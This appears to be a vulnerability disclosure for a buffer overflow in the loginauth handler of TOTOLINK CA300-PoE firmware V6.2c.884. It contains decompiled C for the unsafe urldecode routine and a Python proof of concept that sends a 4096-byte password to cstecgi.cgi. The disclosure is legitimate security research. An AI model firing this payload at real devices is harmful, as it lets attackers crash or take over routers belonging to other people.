## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/139/ids/36.html

## Affected version

CA300-PoE_Firmware V6.2c.884

## Vulnerability details

In the CA300-PoE_Firmware V6.2c.884 firmware has a buffer overflow vulnerability in the `loginauth` function. The `v10` variable receives the `password` parameter from a POST request. However, since the user can control the input of `password`, the statement `urldecode(v10, v29);` can cause a buffer overflow injection vulnerability.

![image-20240722012201923](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240722012201923.png)

```c
_BYTE *__fastcall urldecode(int a1, _BYTE *a2)
{
  _BYTE *v3; // $s2
  int v4; // $s1
  unsigned int i; // $s0
  int v6; // $v0
  int v7; // $v1
  int v8; // $v0
  char v9; // $a0
  char v10; // $a2
  char v11; // $v1
  char v12; // $a0
  char v13; // $a2
  _BYTE *v15; // [sp+4Ch] [+2Ch]

  v15 = a2;
  v3 = a2;
  v4 = 1;
  for ( i = 0; i < strlen(a1); ++i )
  {
    v6 = *(char *)(a1 + i);
    if ( v6 == 37 )
    {
      v7 = *(char *)(a1 + i + 1);
      i += 2;
      v8 = *(char *)(a1 + i);
      v9 = 0;
      if ( v7 >= 65 )
        v9 = 7;
      v10 = 0;
      if ( v7 >= 97 )
        v10 = 32;
      v11 = v7 - 48 - v9 - v10;
      v12 = 0;
      if ( v8 >= 65 )
        v12 = 7;
      v13 = 0;
      if ( v8 >= 97 )
        v13 = 32;
      *v3 = v8 - 48 - v12 - v13 + 16 * v11;
    }
    else
    {
      *v3 = v6;
    }
    ++v4;
    ++v3;
  }
  v15[v4 - 1] = 0;
  return v15;
}
```

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"username":"admin","password":"a"*0x1000,"flag":"0","topicurl":"loginAuth"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240720235757375](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240720235757375.png)
